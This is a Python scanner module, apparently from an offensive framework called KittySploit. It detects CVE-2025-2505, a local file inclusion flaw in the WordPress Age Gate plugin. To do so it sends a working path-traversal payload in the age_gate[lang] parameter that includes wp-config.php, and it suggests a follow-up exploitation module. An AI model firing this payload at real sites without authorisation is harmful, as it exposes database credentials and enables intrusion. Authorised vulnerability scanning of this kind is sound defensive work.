#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Age Gate <= 3.5.3 REST lang LFI (CVE-2025-2505)."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress

_PLUGIN = "age-gate"
_VULN_HIGH = (3, 5, 3)


class Module(Scanner, Http_client, Wordpress):
    __info__ = {
        "name": "Age Gate CVE-2025-2505 LFI detect",
        "description": (
            "Detects CVE-2025-2505: age_gate[lang] traversal on /?rest_route=/age-gate/v3/check "
            "includes wp-config.php (DB_NAME already defined)."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": "CVE-2025-2505",
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2025-2505"],
        "modules": ["auxiliary/admin/http/age_gate_cve_2025_2505_lfi"],
        "tags": ["web", "scanner", "wordpress", "age-gate", "lfi", "cve-2025-2505"],
        "agent": {
            "chain": {"suggested_followups": ["auxiliary/admin/http/age_gate_cve_2025_2505_lfi"]},
        },
    }

    base_path = OptString("/", "WordPress base path", required=False)

    def _join(self, suffix: str) -> str:
        base = self.wp_normalize_base_path(self.base_path or "/")
        return base if suffix == "/" else f"{base}{suffix}" if base != "/" else suffix

    def run(self):
        version = self.wp_plugin_version(_PLUGIN, self.wp_normalize_base_path(self.base_path or "/")) or ""
        if version and not self.wp_version_in_range(version, (0, 0, 0), _VULN_HIGH):
            return False
        base = self._join("/?rest_route=/age-gate/v3/check")
        ok = self.http_request(method="GET", path=base, allow_redirects=False)
        if not ok or ok.status_code != 200 or "age_gate" not in (ok.text or ""):
            return False
        lfi = self.http_request(
            method="GET",
            path=self._join("/"),
            params={
                "rest_route": "/age-gate/v3/check",
                "age_gate[lang]": "../../../../../../../../wp-config",
            },
            allow_redirects=False,
        )
        if lfi and lfi.status_code == 200 and "DB_NAME already defined" in (lfi.text or ""):
            self.set_info(
                severity="critical",
                reason="Age Gate CVE-2025-2505 — wp-config include via lang parameter",
                path="/?rest_route=/age-gate/v3/check",
                cve="CVE-2025-2505",
            )
            return True
        return False
